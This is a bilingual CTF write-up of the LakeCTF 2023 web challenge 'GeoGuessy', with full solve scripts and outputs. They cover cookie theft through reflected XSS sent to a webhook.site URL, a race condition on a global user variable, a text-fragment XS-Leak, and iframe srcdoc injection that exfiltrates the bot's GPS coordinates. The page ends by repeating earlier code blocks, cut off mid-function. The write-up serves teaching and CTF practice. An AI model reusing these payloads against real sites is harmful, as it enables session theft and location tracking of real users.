# XSS, Race Condition, XS-Leaks and CSP & iframe’s sandbox bypass – LakeCTF 2023 GeoGuessy

> 原文: https://www.ctfiot.com/146539.html
> ID: 146539

GeoGuessy GeoGuessy的

Description 描述

This is NOT an OSINT challenge 🙂 (PS: please have a working exploit locally before destroying the remote 🙏)

这不是 OSINT 挑战:)（PS：在销毁遥控器🙏之前，请在本地有一个有效的漏洞利用）

URL: https://chall.polygl0ts.ch:
9011

Source code of the challenge: handout.tar.gz

挑战赛源代码： handout.tar.gz

Introduction 介绍

I did not solve this challenge during the competition, but the writeups have provided fascinating insights. In this article, we’ll delve into two unintended solutions and also discuss the intended solution made by the challenge author.

在比赛中，我没有解决这个挑战，但这些文章提供了引人入胜的见解。在本文中，我们将深入探讨两个意想不到的解决方案，并讨论挑战作者提出的预期解决方案。

Every solution generally involves three steps. However, there are several ways to complete the first step.

每个解决方案通常涉及三个步骤。但是，有几种方法可以完成第一步。

Obtain a premium account.

获取高级帐户。

Using an XSS on another challenge (Unintended #1)

在另一个挑战中使用 XSS（意外 #1）

Race condition on global user variable (Unintended #2)

全局用户变量的争用条件（意外 #2）

XS-Leaks using anchor text and lazy loading images (Intended solution)

XS-Leaks 使用锚文本和延迟加载图像（预期解决方案）

XSS against the bot to steal bot’s coordinates

针对机器人的 XSS 以窃取机器人的坐标

Obtain the flag 获取标志

Obtain a premium account

获取高级帐户

Using an XSS on another challenge (Unintended #1)

在另一个挑战中使用 XSS（意外 #1）

Details based on deltaclock’s solution.

详细信息基于 deltaclock 的解决方案。

Reflected XSS: 反射型 XSS：

The challenge is running on chall.polygl0ts.ch:
9011, however there is a reflected XSS vulnerability in another challenge located on the same domain but a different port chall.polygl0ts.ch:
9009.

质询正在运行 chall.polygl0ts.ch:
9011 ，但是在位于同一域但不同端口 chall.polygl0ts.ch:
9009 的另一个质询中存在反映的 XSS 漏洞。

The reflected XSS on the second web challenge allows us to access and steal the cookies of the current challenge which do not have a simple reflected XSS.

第二个 Web 挑战上的反射 XSS 允许我们访问和窃取当前挑战的 cookie，这些 cookie 没有简单的反射 XSS。

http://%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E:
pass@chall.polygl0ts.ch:
9009

Keep in mind this XSS, we will use it later.

请记住这个 XSS，我们稍后会用到它。

Bot redirection: 机器人重定向：

When you want to play with the bot, you can start the bot using the route /bot and then, send an invitation link to the username of the bot. There is the workflow:

当您想使用机器人时，您可以使用路由 /bot 启动机器人，然后向机器人的用户名发送邀请链接。有工作流程：

Make the bot send an invitation to you and get the bot’s username.

让机器人向你发送邀请并获取机器人的用户名。

Send an invitation to the bot thanks to its username.

通过机器人的用户名向机器人发送邀请。

The bot will call the play function and click on your invitation.

机器人将调用该 play 函数并单击您的邀请。

1
2
3
4
5

router.get("/bot", limiter, async (req, res) => {
 if (!req.query.username) return res.status(404).json('what are you even doing lol')
 botChallenge(req.query.username.toString(),premiumPin)
 return res.status(200).json('successfully received :)');
});

 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12

async function play(page) { // admin accepts all challenges :)
 while (true) {
 try {
 await sleep(100)
 linkHandlers = await page.$x("//a[contains(text(), 'Click here to play!')]");
 if (linkHandlers.length > 0) {
 await linkHandlers[0].click();
 }
 } catch (e) {
 }
 }
}

Example of a user receiving a challenge invitation:

用户收到质询邀请的示例：

As you can see above, the bot will click on every anchor that contains the text Click here to play!. You can use an HTML injection inside our username to add another link to the invitation send to the bot.

如上图所示，机器人将单击每个包含文本 Click here to play! 的锚点。您可以在 our username 中使用 HTML 注入来添加另一个链接，以发送到机器人的邀请。

 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21

router.post('/challengeUser', async (req, res) => {
 token = req.cookies["token"]
 if (token) {
 user = await db.getUserBy("token", token)

 if (user && req.body["username"] && req.body["duelID"]) {
 targetUser = await db.getUserBy("username", req.body["username"].toString())
 if (!targetUser)
 return res.status(401).json('who dis?');

 chall = await db.getChallengeById(req.body["duelID"].toString())
 if (!chall)
 return res.status(401).json('huh?');

 // user.username contains the HTML injection
 db.addNotificationToUserToken(targetUser.token, `${user.username} has challenged you to a game! [Click here to play!](/challenge?id=${chall.id})`)
 return res.status(200).json('yes ok');
 }
 }
 return res.status(401).json('no');
});

1
2
3
4

socket.on("notifications", (data) => {
 // ...
 notificationsList.innerHTML = DOMPurify.sanitize(notifHTML);
});

We cannot directly insert an XSS in our username as DOMPurify (latest version) is used on the client-side application. But we can create a link in our username containing the text Click here to play!. So, the bot will be redirected wherever we want!

我们不能直接在 username 客户端应用程序上使用的 XSS DOMPurify （最新版本）中插入。但是我们可以在用户名中创建一个包含文本 Click here to play! 的链接。因此，机器人将被重定向到我们想要的任何地方！

Chaining redirection and XSS:

链接重定向和 XSS：

We can chain this bot redirection with the previous reflected XSS vulnerability to steal the bot’s cookie and become premium!

我们可以将此机器人重定向与之前反射的 XSS 漏洞链接起来，以窃取机器人的 cookie 并成为高级！

 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29

WEBHOOK = "https://webhook.site/c3a60869-6a80-4117-b7d4-693c4ba93af6"

REFLECTED_XSS = urllib.parse.quote_plus(f"<script>fetch('{WEBHOOK}?'.concat(document.cookie))</script>")
XSS_STEAL_TOKEN = f'[Click here to play!](http://{REFLECTED_XSS}:
pass@chall.polygl0ts.ch:
9009/)'

def leak_admin_token():
 """
 Leak admin token (cookies).

 1. Register a user with an XSS inside its username.
 2. Retrieve the admin username from the notification game send by the bot.
 3. Send a duel challenge to the admin with the XSS.
 4. Receive the admin token on our webhook thanks to the XSS.
 """
 user_xss = User()
 user_xss.register()
 user_xss.change_username(XSS_STEAL_TOKEN)
 challenge_id = user_xss.create_challenge()

 user_recv_invit = User()
 user_recv_invit.register()
 user_recv_invit.bot_recv_invitation()
 admin_username, _ = user_recv_invit.get_notification()

 user_xss.challenge_user(challenge_id, admin_username)

leak_admin_token()
# https://webhook.site/c3a60869-6a80-4117-b7d4-693c4ba93af6?token=9d31e6fb14d02f0cf646c230b650cd8a

Script execution output:

脚本执行输出：

 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11

[20ecddd2690b291bba96c5d49432166c] Registered as: RoughHurt2208
[20ecddd2690b291bba96c5d49432166c] Username updated to: [Click here to play!](http://%3Cscript%3Efetch%28%27https%3A%2F%2Fwebhook.site%2Fc3a60869-6a80-4117-b7d4-693c4ba93af6%3F%27.concat%28document.cookie%29%29%3C%2Fscript%3E:
pass@chall.polygl0ts.ch:
9009/)
[20ecddd2690b291bba96c5d49432166c] Challenge '0fb579eb211d294eba586d80fce5aadf' created with OpenLayersVersion:
[2995247d09fecd4f7bb3889d9c992799] Registered as: VigorousBoard1479
[2995247d09fecd4f7bb3889d9c992799] Bot send an invitation to: VigorousBoard1479
[2995247d09fecd4f7bb3889d9c992799] Connecting to socket.io...
[2995247d09fecd4f7bb3889d9c992799] Received: ['status', 'authSuccess']
[2995247d09fecd4f7bb3889d9c992799] Received: ['notifications', []]
[2995247d09fecd4f7bb3889d9c992799] Received: ['notifications', ['FrenchSize8523 has challenged you to a game! [Click here to play!](/challenge?id=4d6ca7d6e29aadd2eade7f8f82fefdff)']]
[2995247d09fecd4f7bb3889d9c992799] Received a game request from 'FrenchSize8523' for challenge '4d6ca7d6e29aadd2eade7f8f82fefdff'.
[20ecddd2690b291bba96c5d49432166c] Challenge sent to: FrenchSize8523

Race condition on global user variable (Unintended #2)

全局用户变量的争用条件（意外 #2）

Details based on strellic’s solution.

详细信息基于 strellic 的解决方案。

Another method to obtain a premium account exploits the fact that the user variable is global in the routes/index.js file. By registering a user simultaneously as the bot enters a premium PIN to upgrade its account to premium, the attacker’s user account will become premium instead of the bot’s account.

获取高级帐户的另一种方法利用了变量在 routes/index.js 文件中是全局 user 变量这一事实。通过在机器人输入高级 PIN 以将其帐户升级为高级帐户时同时注册用户，攻击者的用户帐户将成为高级帐户，而不是机器人的帐户。

 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32

router.get('/', async (req, res) => {
 user = await db.getUserBy("token", req.cookies?.token)
 // ...
});

router.get('/register', async (req, res) => {
 token = crypto.randomBytes(16).toString('hex');
 username = generateUsername()
 // [...]
 await db.registerUser(username, token);
 res.setHeader('Set-Cookie',`token=${token}`);
 return res.render('welcome', {username, token});
});

router.post('/updateUser', async (req, res) => {
 token = req.cookies["token"]
 if (token) {
 user = await db.getUserBy("token", token)
 if (user) {
 enteredPremiumPin = req.body["premiumPin"]
 if (enteredPremiumPin) {
 enteredPremiumPin = enteredPremiumPin.toString()
 if (enteredPremiumPin == premiumPin) {
 user.isPremium = 1 // <---- Bot will trigger this
 } else {
 return res.status(401).json('wrong premium pin');
 }
 }
 // [...]
 }
 return res.status(401).json('no');
});

To automate the race condition, I’ve developed a Python script, which you can see below:

为了自动化竞争条件，我开发了一个 Python 脚本，您可以在下面看到它：

 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46

import threading
import sys
from time import sleep

from user import User

def register_and_check():
 """Register a user and check if it is premium."""
 user = User()
 user.register()

 sleep(1)
 if user.check_premium():
 print(f"[{user.token}] Premium user found: {user.username} !!!!!!!!!!!!!!!!!!!!!!")
 sys.exit(0)
 else:
 print(f"[{user.token}] {user.username} is not premium :(")

def obtain_premium_user():
 """
 Obtain a premium user.

 1. Register a user and ask the bot to send an invitation to itself.
 2. Register multiple users in parallel to exploit a race condition between 'updateUser' and 'register'.
 3. Check if one of the user is premium.
 """
 threads = []

 user_run_bot = User()
 user_run_bot.register()
 user_run_bot.bot_recv_invitation()

 number_of_users = 30
 sleep(0.8)
 for _ in range(number_of_users):
 thread = threading.Thread(target=register_and_check)
 threads.append(thread)
 thread.start()
 sleep(0.05)

 for thread in threads:
 thread.join()

if __name__ == "__main__":
 obtain_premium_user()

Quickly after running the script, we successfully obtain a premium account!

运行脚本后，我们很快就成功获得了一个高级帐户！

 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28

$ python3 workflow_race.py
[068ec97e07f77a7fc421d30f2ba5caec] Registered as: IgnorantArt4455
[068ec97e07f77a7fc421d30f2ba5caec] Bot send an invitation to: IgnorantArt4455
[697c5496912e36412f304e1909f056ff] Registered as: CaninePerception7932
[f4b0cb37bb77271f61e64ea9b5e6e2df] Registered as: CapitalGrade3691
[ca99279ac37efc688846ae3e0098779f] Registered as: ClumsyBet6554
[9b43ff4813c07feef7800654147d0b25] Registered as: DrearyAddition9269
[27191995a85630eaf5c3cbda7994cd67] Registered as: WorseDatabase538
[b6f8ee766ebef10b6e0030dbae2605bf] Registered as: CautiousWelcome9613
[80e4d9eb99ce13f7207d8c9a717ca560] Registered as: PuzzledAdvance6260
[6cbd9a953c0858c747886e030035801c] Registered as: NovelCancer8356
[11edf35e5df139c10659b084915d3531] Registered as: CleverRich7660
[4f9a9b63d4b023da140c50e222e0e44f] Registered as: HappyTelevision858
[4f9a9b63d4b023da140c50e222e0e44f] Registered as: HappyTelevision858
[eba79b4ca5d24695c8b0bb3b6e8e6266] Registered as: IgnorantBeing5948
[03d83a8ba88f12de211b6890167e7db4] Registered as: Far-offSentence6259
[aed123e8bbc24916191d744cd327b923] Registered as: TurbulentSignal2480
[527c2f33957a9dfda3d76480c1c6c1c2] Registered as: EllipticalType5668
[7a6175f88165a634c72d509f5811d1bf] Registered as: PrivateBike1436
[709d3daedcc12dfdb3de74559cf59ba3] Registered as: WonderfulSystem8145
[d3975b6af74dd2a562f13d3a97706f90] Registered as: InfamousIron2087
[5011edd48f834bd7321d55f9474ee1ce] Registered as: KaleidoscopicRemote4902
[dae7cc3f170097b24527ce9b71019c90] Registered as: HeartyImpress7113
[697c5496912e36412f304e1909f056ff] CaninePerception7932 is not premium :(
[d7befb049e344f99b420ed9e9ad5b0a6] Registered as: UnripeProof2269
[c8c4e0b2283ce5d90ea65de0f39d9310] Registered as: FineSignificance2232
[f4b0cb37bb77271f61e64ea9b5e6e2df] CapitalGrade3691 is not premium :(
[ca99279ac37efc688846ae3e0098779f] Premium user found: ClumsyBet6554 !!!!!!!!!!!!!!!!!!!!!!

XS-Leaks using anchor text and lazy loading images (Intended solution)

XS-Leaks 使用锚文本和延迟加载图像（预期解决方案）

Details based on pilvar’s solution (challenge author).

详细信息基于 pilvar 的解决方案（挑战作者）。

To be honest, I didn’t have the motivation to develop a full exploit script for this solution, so I will only outline the theoretical method of exploitation.

老实说，我没有动力为这个解决方案开发一个完整的漏洞利用脚本，所以我只概述理论上的漏洞利用方法。

Redirect the bot to your webhook using the Click here to play! technique as previously discussed.

使用前面讨论 Click here to play! 的技术将机器人重定向到 Webhook。

Open a new page within a window of fixed size featuring a scroll bar. The purpose of this is to hide the notifications section, we will see later why.

在具有滚动条的固定大小的窗口中打开一个新页面。这样做的目的是隐藏通知部分，我们稍后会看到原因。

Utilize Chrome’s Backward/Forward cache (bfcache) to return to the settings page with the premium PIN still present in the input form.

利用 Chrome 的后退/前进缓存 （ bfcache ） 返回设置页面，输入表单中仍存在高级 PIN。

Modify the opener URL using a Text Fragment (e.g., https://example.com#:~:
text=[prefix-,]textStart[,textEnd][,-suffix]) to search for the PIN within the page content.

使用文本片段（例如， https://example.com#:~:
text=[prefix-,]textStart[,textEnd][,-suffix] ）修改打开程序 URL，以在页面内容中搜索 PIN。

Before changing the opener URL, send a notification to the bot containing the numbers of the PIN you wish to find, and attach a loading lazy image pointing to your webhook.

在更改打开程序 URL 之前，请向机器人发送通知，其中包含要查找的 PIN 码，并附加指向 Webhook loading lazy 的图像。

If the PIN in the Text fragments is correct, the page won’t scroll. Otherwise, the user will scroll to the notification area, triggering the automatic loading of the image.

如果 中的 PIN Text fragments 正确，页面将不会滚动。否则，用户将滚动到通知区域，从而触发图像的自动加载。

Now you have a method to extract the nine digits of the PIN, for example, by revealing three digits at a time.

现在，您有一种方法可以提取 PIN 的九位数字，例如，一次显示三位数字。

XSS against the bot

针对机器人的 XSS

Now that we have a premium account (user.isPremium is true), we can specify the winText and OpenLayersVersion variables when we create challenge. A non-premium account can also create challenges but winText and OpenLayersVersion are hardcoded with a default value.

现在我们有一个高级帐户 （ user.isPremium is true ），我们可以在创建挑战时指定 winText 和 OpenLayersVersion 变量。非高级帐户也可能产生挑战，但 winText OpenLayersVersion 使用默认值进行硬编码。

 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23

router.post('/createChallenge', async (req, res) => {
 token = req.cookies["token"]
 if (token) {
 user = await db.getUserBy("token", token)

 if (user && req.body["longitude"] && req.body["latitude"] && req.body["img"]) {
 chalId = crypto.randomBytes(16).toString('hex')
 if (user.isPremium) {
 if ((!req.body["winText"]) || (!req.body["OpenLayersVersion"]))
 return res.status(401).json('huh');
 winText = req.body["winText"].toString()
 OpenLayersVersion = req.body["OpenLayersVersion"].toString()
 } else {
 winText = "Well played! :D"
 OpenLayersVersion = "2.13"
 }

 await db.createChallenge(chalId, user.token, req.body["longitude"].toString(), req.body["latitude"].toString(), req.body["img"].toString(), OpenLayersVersion, winText)
 return res.status(200).json(chalId);
 }
 }
 return res.status(401).json('no');
});

The route to view a challenge:

查看挑战的途径：

 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18

sanitizeHTML = (input) => input.replaceAll("<","&lt;").replaceAll(">","&gt;")

router.get('/challenge', async (req, res) => {
 if (!req.query.id)
 return res.status(404).json('wher id');

 chall = await db.getChallengeById(req.query.id.toString())
 if (!chall)
 return res.status(404).json('no');

 libVersion = chall.OpenLayersVersion
 img = chall.image
 challId = chall.id
 iframeAttributes = "sandbox=\"allow-scripts allow-same-origin\" " // don't trust third party libs
 iframeAttributes += "src=\"/sandboxedChallenge?ver="+sanitizeHTML(libVersion)+"\" "
 iframeAttributes += "width=\"70%\" height=\"97%\" "
 res.render('challenge', {img, challId, iframeAttributes});
});

Challenge EJS page: 挑战 EJS 页面：

1
2
3
4

<%= challId %>
">
>
Submit position

As saw early, we can create a challenge and define the value of OpenLayersVersion. The sanitizeHTMLprevents us to escape the iframe tag, however we can add attributes to the HTML tag. Attributes such as onload or onclick are restricted by the Content-Security Policy (CSP). Nevertheless, the srcdoc attribute can be utilized, which supersedes the already defined src attribute. We can also add the geolocation to the sandbox attribute to be able to leak the GPS coordinates of the bot.

如前所述，我们可以创建一个挑战并定义 OpenLayersVersion 的值。这 sanitizeHTML 阻止了我们对 iframe 标签的转义，但是我们可以向 HTML 标签添加属性。属性，例如 onload 或 onclick 受内容安全策略 （CSP） 限制。但是，可以使用该 srcdoc 属性，它取代了已定义的 src 属性。我们还可以将 添加到 geolocation 属性中 sandbox ，以便能够泄露机器人的 GPS 坐标。

Within the srcdoc attribute, &#60; can be utilized in place of <, this will be still interpreted by our browser and allows us to bypass the sanitizeHTML function. We will use a redirection to our webhook, because the CSP blocks direct javascript execution inside srcdoc. Here’s how the final iframe looks like:

在属性中 srcdoc ，可以用来代替 < ， &#60; 这仍将由我们的浏览器解释，并允许我们绕过该 sanitizeHTML 函数。我们将使用重定向到我们的 webhook，因为 CSP 阻止了内部 srcdoc 的直接 javascript 执行。最终的 iframe 如下所示：

1
2
3
4
5




Here’s the content of my XSS inside my webhook to steal the bot’s coordinates:

这是我的 webhook 中用于窃取机器人坐标的 XSS 内容：

1
2
3
4
5
6
7


 <script>
 navigator.geolocation.getCurrentPosition((pos) => {
 fetch(`https://webhook.site/c3a60869-6a80-4117-b7d4-693c4ba93af6/lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`)
 });
 </script>


Here’s my solve script for this part:

这是我这部分的求解脚本：

 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22

XSS_STEAL_COORDS = f'" srcdoc="&#60;meta http-equiv=\'refresh\' content=\'1; url={WEBHOOK}\'&#62;" allow="geolocation {WEBHOOK}" x="'

def leak_admin_gps(admin_token):
 """
 Leak admin GPS location.

 1. Use the admin account to create a challenge with an XSS inside the OpenLayersVersion parameter.
 2. Get the admin username by receiving the notification game send by the bot.
 3. Send a challenge request to the admin with the XSS.
 4. Receive the admin GPS location on our webhook thanks to the XSS.
 """
 premium_user = User(token=admin_token)
 challenge_id = premium_user.create_challenge(OpenLayersVersion=XSS_STEAL_COORDS)

 user_recv_invit = User()
 user_recv_invit.register()
 user_recv_invit.bot_recv_invitation()
 admin_username, _ = user_recv_invit.get_notification()

leak_admin_gps(admin_token="9d31e6fb14d02f0cf646c230b650cd8a")
# https://webhook.site/c3a60869-6a80-4117-b7d4-693c4ba93af6/lat=60.792937&lon=11.100984

Here’s the output: 输出如下：

1
2
3
4
5
6
7
8
9

[823fa49e380846156a4e78cd3ba6c346] Challenge 'c556bfaa3e57e8234aff4fe559de1d49' created with OpenLayersVersion: " srcdoc="&#60;meta http-equiv='refresh' content='1; url=https://webhook.site/c3a60869-6a80-4117-b7d4-693c4ba93af6'&#62;" allow="geolocation https://webhook.site/c3a60869-6a80-4117-b7d4-693c4ba93af6" x="
[c941e1b04bd79d753359b57c09e36b6c] Registered as: SpiritedApartment9854
[c941e1b04bd79d753359b57c09e36b6c] Bot send an invitation to: SpiritedApartment9854
[c941e1b04bd79d753359b57c09e36b6c] Connecting to socket.io...
[c941e1b04bd79d753359b57c09e36b6c] Received: ['status', 'authSuccess']
[c941e1b04bd79d753359b57c09e36b6c] Received: ['notifications', []]
[c941e1b04bd79d753359b57c09e36b6c] Received: ['notifications', ['DistortedSlice3492 has challenged you to a game! [Click here to play!](/challenge?id=766ec00653beea3a2aa116a4f992f6e0)']]
[c941e1b04bd79d753359b57c09e36b6c] Received a game request from 'DistortedSlice3492' for challenge '766ec00653beea3a2aa116a4f992f6e0'.
[823fa49e380846156a4e78cd3ba6c346] Challenge sent to: DistortedSlice3492

Copy

Obtain the flag 获取标志

Once we have the bot coordinates, we can win the bot’s challenge and obtain the flag!

一旦我们有了机器人坐标，我们就可以赢得机器人的挑战并获得旗帜！

 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12

def get_flag(latitude, longitude):
 """Get the flag by solving a challenge with the admin GPS location."""
 win_user = User()
 win_user.register()
 win_user.bot_recv_invitation()

 _, challenge_id = win_user.get_notification()
 flag = win_user.solve_challenge(challenge_id, latitude, longitude)
 print(f"{flag = }")

get_flag(latitude="60.792937", longitude="11.100984")
# EPFL{as a wise man once said, https://twitter.com/arkark_/status/1712773241218183203}

Execution of the script:

脚本的执行：

1
2
3
4
5
6
7
8
9

[43ea8c0e81990644f9b7e30a12ddc2ec] Registered as: UnpleasantWinner2868
[43ea8c0e81990644f9b7e30a12ddc2ec] Bot send an invitation to: UnpleasantWinner2868
[43ea8c0e81990644f9b7e30a12ddc2ec] Connecting to socket.io...
[43ea8c0e81990644f9b7e30a12ddc2ec] Received: ['status', 'authSuccess']
[43ea8c0e81990644f9b7e30a12ddc2ec] Received: ['notifications', []]
[43ea8c0e81990644f9b7e30a12ddc2ec] Received: ['notifications', ['DirtyPeople3320 has challenged you to a game! [Click here to play!](/challenge?id=2fb16891fce844d41eab9df526abc1c6)']]
[43ea8c0e81990644f9b7e30a12ddc2ec] Received a game request from 'DirtyPeople3320' for challenge '2fb16891fce844d41eab9df526abc1c6'.
[43ea8c0e81990644f9b7e30a12ddc2ec] Challenge '2fb16891fce844d41eab9df526abc1c6' solved with latitude: 60.792937 and longitude: 11.100984
flag = 'EPFL{as a wise man once said, https://twitter.com/arkark_/status/1712773241218183203}'

We can get the flag EPFL{as a wise man once said, https://twitter.com/arkark_/status/1712773241218183203} !

我们可以得到旗帜 EPFL{as a wise man once said, https://twitter.com/arkark_/status/1712773241218183203} ！

For all my exploitation scripts, I used the following User class that I developed:

对于我的所有漏洞利用脚本，我使用了我开发的以下 User 类：

 1
 2
 3
 4
 5
 6
 7
 8
 9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101

import secrets

import requests
import socketio # python3 -m pip install "python-socketio[client]"

URL = "https://chall.polygl0ts.ch:
9011"
URL = "http://localhost:
9011"

class User:

 def __init__(self, username=None, token=None):
 self.sess = requests.Session()
 self.username = username
 self.token = token
 self.sio = socketio.Client()

 if self.token:
 self.sess.cookies.set("token", self.token)

 def check_premium(self):
 """Check if the user is premium."""
 html = self.sess.get(URL).text
 return '1' in html

 def register(self):
 """Register a user on the application."""
 html = self.sess.get(URL + "/register").text
 self.username = html.split('')[1].split("")[0]
 self.token = html.split('')[1].split("")[0]
 print(f"[{self.token}] Registered as: {self.username}")

 def change_username(self, new_username):
 """Change the username of the user."""
 self.sess.post(URL + "/updateUser", json={
 "username": new_username + secrets.token_hex(8), # to avoid duplicate username
 })
 self.username = new_username
 print(f"[{self.token}] Username updated to: {self.username}")

 def bot_recv_invitation(self, target_username=None):
 """Make the bot invite the user to a game."""
 if target_username is None:
 target_username = self.username

 self.sess.get(URL + "/bot?username=" + target_username)
 print(f"[{self.token}] Bot send an invitation to: {target_username}")

 def challenge_user(self, challenge_id, target_username=None):
 """Challenge a user to a game."""
 if target_username is None:
 target_username = self.username

 self.sess.post(URL + "/challengeUser", json={
 "username": target_username,
 "duelID": challenge_id
 })
 print(f"[{self.token}] Challenge sent to: {target_username}")

 def get_notification(self):
 """Receive the notification game send by a game request."""
 print(f"[{self.token}] Connecting to socket.io...")
 with socketio.SimpleClient() as sio:
 sio.connect(URL)
 data = sio.receive()
 if data[1] == "auth":
 sio.emit("auth", self.token)

 while True:
 data = sio.receive()
 print(f"[{self.token}] Received: {data}")
 if data[0] == "notifications" and data[1]:
 notifications = data[1][0]
 username = notifications.split(" ")[0]
 challenge_id = notifications.split("?id=")[1].split('"')[0]
 print(f"[{self.token}] Received a game request from '{username}' for challenge '{challenge_id}'.")
 sio.disconnect()
 return username, challenge_id

 def create_challenge(self, longitude="0.0", latitude="0.0", img="abc", winText="xyz", OpenLayersVersion=""):
 """Create a challenge."""
 resp = self.sess.post(URL + "/createChallenge", json={
 "longitude": longitude,
 "latitude": latitude,
 "img": img,
 "winText": winText,
 "OpenLayersVersion": OpenLayersVersion
 })
 challenge_id = resp.text.strip('"')
 print(f"[{self.token}] Challenge '{challenge_id}' created with OpenLayersVersion: {OpenLayersVersion}")
 return challenge_id

 def solve_challenge(self, challenge_id, latitude, longitude):
 """Solve a challenge."""
 resp = self.sess.post(URL + "/solveChallenge", json={
 "challId": challenge_id,
 "longitude": longitude,
 "latitude": latitude
 })
 print(f"[{self.token}] Challenge '{challenge_id}' solved with latitude: {latitude} and longitude: {longitude}")
 return resp.text.strip('"')


```
1
2
3
4
5
router.get("/bot", limiter, async (req, res) => {
 if (!req.query.username) return res.status(404).json('what are you even doing lol')
 botChallenge(req.query.username.toString(),premiumPin)
 return res.status(200).json('successfully received :)');
});
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
async function play(page) { // admin accepts all challenges :)
 while (true) {
 try {
 await sleep(100)
 linkHandlers = await page.$x("//a[contains(text(), 'Click here to play!')]");
 if (linkHandlers.length > 0) {
 await linkHandlers[0].click();
 }
 } catch (e) {
 }
 }
}
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
router.post('/challengeUser', async (req, res) => {
 token = req.cookies["token"]
 if (token) {
 user = await db.getUserBy("token", token)

 if (user && req.body["username"] && req.body["duelID"]) {
 targetUser = await db.getUserBy("username", req.body["username"].toString())
 if (!targetUser)
 return res.status(401).json('who dis?');

 chall = await db.getChallengeById(req.body["duelID"].toString())
 if (!chall)
 return res.status(401).json('huh?');

 // user.username contains the HTML injection
 db.addNotificationToUserToken(targetUser.token, `${user.username} has challenged you to a game! [Click here to play!](/challenge?id=${chall.id})`)
 return res.status(200).json('yes ok');
 }
 }
 return res.status(401).json('no');
});
1
2
3
4
socket.on("notifications", (data) => {
 // ...
 notificationsList.innerHTML = DOMPurify.sanitize(notifHTML);
});
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
WEBHOOK = "https://webhook.site/c3a60869-6a80-4117-b7d4-693c4ba93af6"

REFLECTED_XSS = urllib.parse.quote_plus(f"<script>fetch('{WEBHOOK}?'.concat(document.cookie))</script>")
XSS_STEAL_TOKEN = f'[Click here to play!](http://{REFLECTED_XSS}:
pass@chall.polygl0ts.ch:
9009/)'

def leak_admin_token():
 """
 Leak admin token (cookies).

 1. Register a user with an XSS inside its username.
 2. Retrieve the admin username from the notification game send by the bot.
 3. Send a duel challenge to the admin with the XSS.
 4. Receive the admin token on our webhook thanks to the XSS.
 """
 user_xss = User()
 user_xss.register()
 user_xss.change_username(XSS_STEAL_TOKEN)
 challenge_id = user_xss.create_challenge()

 user_recv_invit = User()
 user_recv_invit.register()
 user_recv_invit.bot_recv_invitation()
 admin_username, _ = user_recv_invit.get_notification()

 user_xss.challenge_user(challenge_id, admin_username)

leak_admin_token()
# https://webhook.site/c3a60869-6a80-4117-b7d4-693c4ba93af6?token=9d31e6fb14d02f0cf646c230b650cd8a
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
[20ecddd2690b291bba96c5d49432166c] Registered as: RoughHurt2208
[20ecddd2690b291bba96c5d49432166c] Username updated to: [Click here to play!](http://%3Cscript%3Efetch%28%27https%3A%2F%2Fwebhook.site%2Fc3a60869-6a80-4117-b7d4-693c4ba93af6%3F%27.concat%28document.cookie%29%29%3C%2Fscript%3E:
pass@chall.polygl0ts.ch:
9009/)
[20ecddd2690b291bba96c5d49432166c] Challenge '0fb579eb211d294eba586d80fce5aadf' created with OpenLayersVersion:
[2995247d09fecd4f7bb3889d9c992799] Registered as: VigorousBoard1479
[2995247d09fecd4f7bb3889d9c992799] Bot send an invitation to: VigorousBoard1479
[2995247d09fecd4f7bb3889d9c992799] Connecting to socket.io...
[2995247d09fecd4f7bb3889d9c992799] Received: ['status', 'authSuccess']
[2995247d09fecd4f7bb3889d9c992799] Received: ['notifications', []]
[2995247d09fecd4f7bb3889d9c992799] Received: ['notifications', ['FrenchSize8523 has challenged you to a game! [Click here to play!](/challenge?id=4d6ca7d6e29aadd2eade7f8f82fefdff)']]
[2995247d09fecd4f7bb3889d9c992799] Received a game request from 'FrenchSize8523' for challenge '4d6ca7d6e29aadd2eade7f8f82fefdff'.
[20ecddd2690b291bba96c5d49432166c] Challenge sent to: FrenchSize8523
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
router.get('/', async (req, res) => {
 user = await db.getUserBy("token", req.cookies?.token)
 // ...
});

router.get('/register', async (req, res) => {
 token = crypto.randomBytes(16).toString('hex');
 username = generateUsername()
 // [...]
 await db.registerUser(username, token);
 res.setHeader('Set-Cookie',`token=${token}`);
 return res.render('welcome', {username, token});
});

router.post('/updateUser', async (req, res) => {
 token = req.cookies["token"]
 if (token) {
 user = await db.getUserBy("token", token)
 if (user) {
